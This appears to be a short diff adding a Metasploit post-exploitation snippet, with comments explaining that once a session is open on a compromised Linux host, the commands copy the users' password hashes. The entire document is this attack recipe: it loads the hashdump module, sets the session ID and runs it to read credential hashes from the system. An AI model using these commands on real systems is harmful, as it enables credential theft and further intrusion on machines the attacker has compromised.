@@ -1,0 +1,5 @@
+# When you have 1 session openned, 
+# you can run this to copy the user's hash password
+use post/linux/gather/hashdump
+set SESSION 1 # Put the id session
+run
